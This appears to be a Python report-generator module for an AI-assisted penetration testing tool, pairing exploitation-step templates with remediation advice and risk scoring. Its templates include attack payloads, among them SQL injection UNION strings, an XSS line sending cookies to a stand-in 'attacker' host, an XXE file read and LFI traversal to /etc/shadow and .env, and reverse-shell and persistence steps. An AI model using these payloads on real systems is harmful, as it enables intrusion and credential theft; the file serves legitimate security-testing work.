"""
Detailed Reporting Engine
Generates thorough vulnerability reports with exploitation guides,
risk assessments, and remediation recommendations.
Inspired by pentagi's detailed reporting system.
"""

import os
from datetime import datetime
from pathlib import Path
from typing import Optional


# Where reports are saved
_DEFAULT_LOOT_DIR = Path(os.environ.get("LOOT_DIR", "./loot"))

# Severity weights for risk calculation
_SEVERITY_WEIGHTS = {
    "critical": 10.0,
    "high": 8.0,
    "medium": 5.0,
    "low": 2.0,
    "info": 0.5,
}

# Built-in exploitation guide templates by vulnerability type
_EXPLOITATION_TEMPLATES = {
    "sqli": {
        "title": "SQL Injection",
        "steps": [
            "Identify injection point (parameter, header, cookie)",
            "Determine database type via error-based or blind techniques",
            "Extract database version: ' UNION SELECT version()-- -",
            "Enumerate databases: ' UNION SELECT schema_name FROM information_schema.schemata-- -",
            "Extract tables and columns from target database",
            "Dump sensitive data (credentials, PII)",
            "Attempt OS command execution via xp_cmdshell (MSSQL) or LOAD_FILE (MySQL)",
            "Escalate to remote code execution if possible",
        ],
        "tools": ["sqlmap", "burpsuite", "manual injection"],
    },
    "xss": {
        "title": "Cross-Site Scripting (XSS)",
        "steps": [
            "Identify reflected/stored/DOM-based XSS injection point",
            "Test basic payload: <script>alert(1)</script>",
            "Bypass WAF filters using encoding/obfuscation",
            "Craft session-stealing payload: <script>fetch('https://attacker/steal?c='+document.cookie)</script>",
            "Test for DOM manipulation to phish credentials",
            "Chain with CSRF for account takeover",
        ],
        "tools": ["dalfox", "xsstrike", "burpsuite"],
    },
    "ssrf": {
        "title": "Server-Side Request Forgery (SSRF)",
        "steps": [
            "Identify SSRF-vulnerable parameter (URL, redirect, webhook)",
            "Test internal network access: http://127.0.0.1, http://169.254.169.254",
            "Enumerate internal services via port scanning through SSRF",
            "Access cloud metadata endpoints (AWS/GCP/Azure)",
            "Attempt to read internal files via file:// protocol",
            "Pivot to internal services for further exploitation",
        ],
        "tools": ["burpsuite", "ssrf-detect", "curl"],
    },
    "rce": {
        "title": "Remote Code Execution (RCE)",
        "steps": [
            "Confirm code execution with benign command (id, whoami, ping)",
            "Determine OS and architecture",
            "Establish reverse shell or bind shell",
            "Enumerate local system (users, network, processes)",
            "Attempt privilege escalation",
            "Establish persistence if authorized",
        ],
        "tools": ["msfconsole", "searchsploit", "commix"],
    },
    "auth_bypass": {
        "title": "Authentication Bypass",
        "steps": [
            "Identify authentication mechanism (session, JWT, OAuth)",
            "Test default credentials against login endpoints",
            "Attempt credential stuffing with known breached credentials",
            "Test for JWT vulnerabilities (none algorithm, weak secret)",
            "Check for IDOR on authenticated endpoints",
            "Test session fixation and session management flaws",
        ],
        "tools": ["hydra", "burpsuite", "jwt_tool"],
    },
    "lfi": {
        "title": "Local File Inclusion (LFI)",
        "steps": [
            "Identify file inclusion parameter",
            "Test basic traversal: ../../etc/passwd",
            "Bypass filters with encoding (%2e%2e%2f) or null bytes",
            "Read sensitive files: /etc/shadow, wp-config.php, .env",
            "Attempt log poisoning for RCE via access logs",
            "Use PHP wrappers (php://filter, php://input) for code execution",
        ],
        "tools": ["burpsuite", "lfi-detect", "ffuf"],
    },
    "xxe": {
        "title": "XML External Entity (XXE) Injection",
        "steps": [
            "Identify XML parsing endpoint",
            "Test basic XXE: <!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]>",
            "Attempt out-of-band data exfiltration",
            "Test for SSRF via XXE",
            "Attempt denial of service via billion laughs",
        ],
        "tools": ["burpsuite", "xxe-detect"],
    },
    "default": {
        "title": "General Vulnerability",
        "steps": [
            "Verify the vulnerability is reproducible",
            "Determine the impact and affected components",
            "Attempt to escalate the vulnerability",
            "Document proof of concept with screenshots/logs",
            "Assess lateral movement potential",
        ],
        "tools": ["manual testing", "burpsuite"],
    },
}

# Remediation templates by vulnerability type
_REMEDIATION_TEMPLATES = {
    "sqli": (
        "**Remediation for SQL Injection:**\n"
        "1. Use parameterized queries / prepared statements for ALL database interactions\n"
        "2. Implement input validation with strict allowlists\n"
        "3. Apply least-privilege database accounts\n"
        "4. Deploy a Web Application Firewall (WAF) as defense-in-depth\n"
        "5. Enable database query logging and monitoring\n"
        "6. Conduct regular code reviews focused on data access layers"
    ),
    "xss": (
        "**Remediation for Cross-Site Scripting:**\n"
        "1. Encode all user-supplied output using context-aware encoding\n"
        "2. Implement Content Security Policy (CSP) headers\n"
        "3. Use HTTPOnly and Secure flags on session cookies\n"
        "4. Validate and sanitize all input on the server side\n"
        "5. Use modern frameworks with built-in XSS protection\n"
        "6. Deploy a WAF with XSS rulesets"
    ),
    "ssrf": (
        "**Remediation for Server-Side Request Forgery:**\n"
        "1. Validate and sanitize all user-supplied URLs\n"
        "2. Implement allowlist of permitted domains and IP ranges\n"
        "3. Block requests to internal/private IP ranges (RFC 1918)\n"
        "4. Disable unnecessary URL schemes (file://, gopher://, etc.)\n"
        "5. Use network segmentation to limit internal access\n"
        "6. Monitor outbound traffic for anomalous requests"
    ),
    "rce": (
        "**Remediation for Remote Code Execution:**\n"
        "1. Patch the vulnerable component immediately\n"
        "2. Implement input validation and sanitization\n"
        "3. Apply least-privilege execution contexts\n"
        "4. Deploy application sandboxing (containers, AppArmor, SELinux)\n"
        "5. Enable runtime application self-protection (RASP)\n"
        "6. Conduct emergency incident response to check for compromise"
    ),
    "auth_bypass": (
        "**Remediation for Authentication Bypass:**\n"
        "1. Implement multi-factor authentication (MFA)\n"
        "2. Use strong, industry-standard authentication libraries\n"
        "3. Enforce strong password policies\n"
        "4. Implement account lockout and rate limiting\n"
        "5. Audit and rotate all default credentials\n"
        "6. Implement proper session management with secure token generation"
    ),
    "lfi": (
        "**Remediation for Local File Inclusion:**\n"
        "1. Never use user input directly in file path operations\n"
        "2. Implement strict allowlist for file inclusions\n"
        "3. Use chroot or containerization to limit file access\n"
        "4. Disable unnecessary PHP wrappers and functions\n"
        "5. Apply least-privilege file system permissions\n"
        "6. Monitor file access patterns for anomalies"
    ),
    "xxe": (
        "**Remediation for XML External Entity Injection:**\n"
        "1. Disable external entity processing in XML parsers\n"
        "2. Use less complex data formats (JSON) where possible\n"
        "3. Patch and update all XML processing libraries\n"
        "4. Implement input validation for XML content\n"
        "5. Apply least-privilege network access for the application\n"
        "6. Use XML schema validation"
    ),
    "default": (
        "**General Remediation:**\n"
        "1. Patch the affected component to the latest version\n"
        "2. Implement input validation and output encoding\n"
        "3. Apply the principle of least privilege\n"
        "4. Enable logging and monitoring for the affected component\n"
        "5. Conduct a thorough code review of the affected area\n"
        "6. Schedule follow-up retest after remediation"
    ),
}


def _classify_finding(finding: dict) -> str:
    """Classify a finding into a vulnerability type based on keywords."""
    content = (
        finding.get("content", "")
        + " "
        + finding.get("category", "")
        + " "
        + finding.get("source", "")
    ).lower()

    if any(kw in content for kw in ["sql injection", "sqli", "sqlmap", "sql"]):
        return "sqli"
    if any(kw in content for kw in ["xss", "cross-site scripting", "reflected", "stored script"]):
        return "xss"
    if any(kw in content for kw in ["ssrf", "server-side request"]):
        return "ssrf"
    if any(kw in content for kw in ["rce", "remote code execution", "command injection", "code execution"]):
        return "rce"
    if any(kw in content for kw in ["auth bypass", "authentication bypass", "default credential"]):
        return "auth_bypass"
    if any(kw in content for kw in ["lfi", "local file inclusion", "file inclusion", "path traversal"]):
        return "lfi"
    if any(kw in content for kw in ["xxe", "xml external entity"]):
        return "xxe"
    return "default"


def _severity_from_finding(finding: dict) -> str:
    """Determine severity from finding content."""
    content = (finding.get("content", "") + " " + finding.get("category", "")).lower()
    if any(kw in content for kw in ["critical", "rce", "remote code"]):
        return "critical"
    if any(kw in content for kw in ["high", "sqli", "sql injection", "auth bypass"]):
        return "high"
    if any(kw in content for kw in ["medium", "xss", "ssrf", "lfi", "xxe"]):
        return "medium"
    if any(kw in content for kw in ["low", "info disclosure", "information"]):
        return "low"
    return "medium"


class ReportGenerator:
    """Generates thorough vulnerability reports with exploitation guides."""

    def __init__(self, loot_dir: Optional[Path] = None):
        self.loot_dir = Path(loot_dir or _DEFAULT_LOOT_DIR)
        self.loot_dir.mkdir(parents=True, exist_ok=True)

    def calculate_risk_score(self, findings: list[dict]) -> float:
        """Calculate overall risk score from 0-10 based on findings."""
        if not findings:
            return 0.0
        total = 0.0
        for f in findings:
            sev = _severity_from_finding(f)
            total += _SEVERITY_WEIGHTS.get(sev, 2.0)
        score = min(10.0, total / max(len(findings), 1) + min(len(findings) * 0.5, 4.0))
        return round(score, 1)

    def generate_exploitation_guide(self, finding: dict) -> str:
        """Generate step-by-step exploitation guide for a finding."""
        vuln_type = _classify_finding(finding)
        template = _EXPLOITATION_TEMPLATES.get(vuln_type, _EXPLOITATION_TEMPLATES["default"])
        lines = [
            f"#### Exploitation Guide — {template['title']}",
            "",
            "**Steps:**",
        ]
        for i, step in enumerate(template["steps"], 1):
            lines.append(f"{i}. {step}")
        lines.append("")
        lines.append(f"**Recommended Tools:** {', '.join(template['tools'])}")
        return "\n".join(lines)

    def generate_remediation(self, finding: dict) -> str:
        """Generate remediation recommendations for a finding."""
        vuln_type = _classify_finding(finding)
        return _REMEDIATION_TEMPLATES.get(vuln_type, _REMEDIATION_TEMPLATES["default"])

    def format_finding(self, finding: dict, index: int) -> str:
        """Format a single finding as detailed markdown."""
        severity = _severity_from_finding(finding)
        vuln_type = _classify_finding(finding)
        category = finding.get("category", "finding")
        source = finding.get("source", "unknown")
        content = finding.get("content", "")
        target = finding.get("target", "N/A")
        timestamp = finding.get("timestamp", "N/A")

        severity_icons = {
            "critical": "🔴",
            "high": "🟠",
            "medium": "🟡",
            "low": "🔵",
            "info": "⚪",
        }
        icon = severity_icons.get(severity, "⚪")

        lines = [
            f"### {icon} Finding #{index}: {vuln_type.upper().replace('_', ' ')}",
            "",
            f"| Field | Value |",
            f"|-------|-------|",
            f"| **Severity** | {severity.upper()} |",
            f"| **Category** | {category} |",
            f"| **Source** | {source} |",
            f"| **Target** | {target} |",
            f"| **Detected** | {timestamp} |",
            "",
            "#### Description",
            "",
            content,
            "",
            "#### Evidence",
            "",
            f"Detected by `{source}` against `{target}`.",
            "",
            "#### Impact",
            "",
            f"This {severity}-severity {vuln_type.replace('_', ' ')} vulnerability "
            f"could allow an attacker to compromise the affected system. "
            f"Severity-weighted risk contribution: {_SEVERITY_WEIGHTS.get(severity, 2.0)}/10.",
            "",
            self.generate_exploitation_guide(finding),
            "",
            self.generate_remediation(finding),
            "",
            "---",
            "",
        ]
        return "\n".join(lines)

    def generate_full_report(
        self,
        session_results: list[dict],
        target: str,
        notes_manager=None,
    ) -> str:
        """Generate a comprehensive markdown vulnerability report.

        Parameters
        ----------
        session_results : list[dict]
            Results from agent runs (each with ``thought_trace``).
        target : str
            Primary target of the assessment.
        notes_manager : NotesManager, optional
            If provided, incorporates saved notes into the report.

        Returns
        -------
        str
            Full markdown report content.
        """
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        # Collect findings from notes manager and session results
        findings: list[dict] = []
        if notes_manager:
            findings.extend(notes_manager.get_notes(target=target) if target else notes_manager.get_notes())

        # Extract findings from session thought traces
        raw_outputs: list[str] = []
        for result in session_results:
            for thought in result.get("thought_trace", []):
                if thought.get("observation"):
                    raw_outputs.append(
                        f"**[{thought.get('node', 'agent').upper()}] "
                        f"`{thought.get('action', 'N/A')}`**\n"
                        f"```\n{thought['observation']}\n```"
                    )
                if thought.get("node") == "tool" and thought.get("observation"):
                    findings.append({
                        "content": thought["observation"],
                        "category": "finding",
                        "source": thought.get("action", "unknown"),
                        "target": target,
                        "timestamp": thought.get("timestamp", timestamp),
                    })

        risk_score = self.calculate_risk_score(findings)

        # Count by severity
        severity_counts: dict[str, int] = {}
        category_counts: dict[str, int] = {}
        for f in findings:
            sev = _severity_from_finding(f)
            severity_counts[sev] = severity_counts.get(sev, 0) + 1
            cat = _classify_finding(f)
            category_counts[cat] = category_counts.get(cat, 0) + 1

        # ── Build report ─────────────────────────────────────────────────
        lines: list[str] = []

        # Title
        lines.extend([
            "# 🛡️ Cyber-Sentry AI — Penetration Test Report",
            "",
            f"**Target:** `{target or 'N/A'}`  ",
            f"**Generated:** {timestamp}  ",
            f"**Risk Score:** {risk_score}/10  ",
            f"**Total Findings:** {len(findings)}",
            "",
            "---",
            "",
        ])

        # 1. Executive Summary
        lines.extend([
            "## 1. Executive Summary",
            "",
            f"A comprehensive penetration test was conducted against **{target or 'the target'}**. "
            f"The assessment identified **{len(findings)} finding(s)** with an overall "
            f"risk score of **{risk_score}/10**.",
            "",
        ])
        if severity_counts:
            lines.append("Severity breakdown:")
            lines.append("")
            for sev in ["critical", "high", "medium", "low", "info"]:
                count = severity_counts.get(sev, 0)
                if count:
                    lines.append(f"- **{sev.upper()}**: {count}")
            lines.append("")
        lines.extend(["---", ""])

        # 2. Scope & Methodology
        lines.extend([
            "## 2. Scope & Methodology",
            "",
            f"- **Target**: `{target or 'N/A'}`",
            "- **Methodology**: OWASP Testing Guide, PTES, OSSTMM",
            "- **Approach**: AI-assisted autonomous penetration testing",
            "- **Phases**: Reconnaissance → Enumeration → Vulnerability Scanning → Exploitation Validation → Reporting",
            f"- **Sessions Analyzed**: {len(session_results)}",
            "",
            "---",
            "",
        ])

        # 3. Findings Summary Table
        lines.extend([
            "## 3. Findings Summary",
            "",
            "| # | Category | Severity | Source | Summary |",
            "|---|----------|----------|--------|---------|",
        ])
        for i, f in enumerate(findings, 1):
            sev = _severity_from_finding(f)
            cat = _classify_finding(f)
            src = f.get("source", "N/A")
            summary = f.get("content", "")[:80].replace("\n", " ")
            lines.append(f"| {i} | {cat} | {sev.upper()} | {src} | {summary} |")
        lines.extend(["", "---", ""])

        # 4. Detailed Findings
        lines.extend([
            "## 4. Detailed Findings",
            "",
        ])
        if findings:
            for i, f in enumerate(findings, 1):
                lines.append(self.format_finding(f, i))
        else:
            lines.extend(["*No findings to report.*", ""])
        lines.extend(["---", ""])

        # 5. Attack Chain Analysis
        lines.extend([
            "## 5. Attack Chain Analysis",
            "",
            "The following attack chains could be constructed from the identified findings:",
            "",
        ])
        if len(findings) >= 2:
            lines.append("```")
            chain_parts = []
            for f in findings[:5]:
                vuln = _classify_finding(f)
                chain_parts.append(vuln.upper().replace("_", " "))
            lines.append(" → ".join(chain_parts))
            lines.append("```")
            lines.append("")
            lines.append(
                "An attacker could chain these vulnerabilities to escalate from initial access "
                "to deeper compromise of the target environment."
            )
        else:
            lines.append("*Insufficient findings to construct attack chains.*")
        lines.extend(["", "---", ""])

        # 6. Risk Assessment Matrix
        lines.extend([
            "## 6. Risk Assessment Matrix",
            "",
            "| Severity | Count | Weight | Subtotal |",
            "|----------|-------|--------|----------|",
        ])
        for sev in ["critical", "high", "medium", "low", "info"]:
            count = severity_counts.get(sev, 0)
            weight = _SEVERITY_WEIGHTS[sev]
            subtotal = count * weight
            lines.append(f"| {sev.upper()} | {count} | {weight} | {subtotal:.1f} |")
        lines.extend([
            "",
            f"**Overall Risk Score: {risk_score}/10**",
            "",
            "---",
            "",
        ])

        # 7. Remediation Priority List
        lines.extend([
            "## 7. Remediation Priority List",
            "",
        ])
        sorted_findings = sorted(
            enumerate(findings),
            key=lambda x: _SEVERITY_WEIGHTS.get(_severity_from_finding(x[1]), 2.0),
            reverse=True,
        )
        for priority, (orig_idx, f) in enumerate(sorted_findings, 1):
            sev = _severity_from_finding(f)
            vuln = _classify_finding(f)
            lines.append(
                f"{priority}. **[{sev.upper()}]** {vuln.upper().replace('_', ' ')} — "
                f"Finding #{orig_idx + 1}"
            )
        if not findings:
            lines.append("*No remediation items.*")
        lines.extend(["", "---", ""])

        # 8. Appendices
        lines.extend([
            "## 8. Appendices",
            "",
            "### A. Raw Tool Outputs",
            "",
        ])
        if raw_outputs:
            for output in raw_outputs:
                lines.append(output)
                lines.append("")
        else:
            lines.append("*No raw outputs captured.*")
            lines.append("")

        lines.extend([
            "### B. Timeline",
            "",
            f"- **Report Generated**: {timestamp}",
            f"- **Sessions**: {len(session_results)}",
            f"- **Findings Collected**: {len(findings)}",
            "",
        ])

        report = "\n".join(lines)

        # Save report to loot directory
        file_ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        report_path = self.loot_dir / f"full_report_{file_ts}.md"
        report_path.write_text(report)

        return report


# Module-level singleton instance
report_generator = ReportGenerator()
